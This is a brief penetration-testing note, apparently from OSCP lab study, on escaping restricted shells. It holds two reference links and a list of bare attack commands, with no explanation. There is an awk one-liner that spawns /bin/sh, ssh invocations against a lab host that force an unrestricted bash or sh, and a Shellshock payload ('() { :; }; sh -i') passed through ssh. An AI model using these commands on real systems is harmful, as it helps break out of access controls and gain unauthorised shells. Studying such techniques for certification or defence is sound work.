identify restricted environment:
<https://blog.certcube.com/restricted-shells-escaping-techniques/>

<https://github.com/R0B1NL1N/OSCP-note/blob/master/gain%20access/shells/spawn_shell_or%20break_out_of_jail.txt>

awk 'BEGIN {system("/bin/sh")}'

ssh -t alfred@10.11.1.101 bash
ssh -t alfred@10.11.1.101 “bash --noprofile -i”
ssh -t alfred@10.11.1.101 -t "() { :; }; sh -i "

